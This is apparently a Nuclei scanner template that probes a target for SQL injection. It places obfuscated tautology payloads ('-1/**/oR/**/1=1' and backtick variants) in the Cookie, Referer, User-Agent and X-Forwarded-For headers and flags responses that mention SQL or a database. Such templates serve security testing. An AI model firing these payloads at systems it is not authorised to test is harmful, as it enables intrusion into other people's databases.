id: based_sqli_header_injection
info:
  author: panch0r3d
  name: Request header based sqli
  severity: high
requests:
- headers:
    Cookie: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '%1'
    Referer: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '%1'
    User-Agent: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like
      '%1'
    X-Forwarded-For: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1
      like '%1'
  matchers:
  - part: body
    regex:
    - (s|S)(q|Q)(l|L)
    - (d|D)(a|A)(t|T)(a|A)(b|B)(a|A)(s|S)(e|E)
    type: regex
  matchers-condition: and
  max-redirects: 5
  method: GET
  path:
  - '{{BaseURL}}/'
  redirects: true
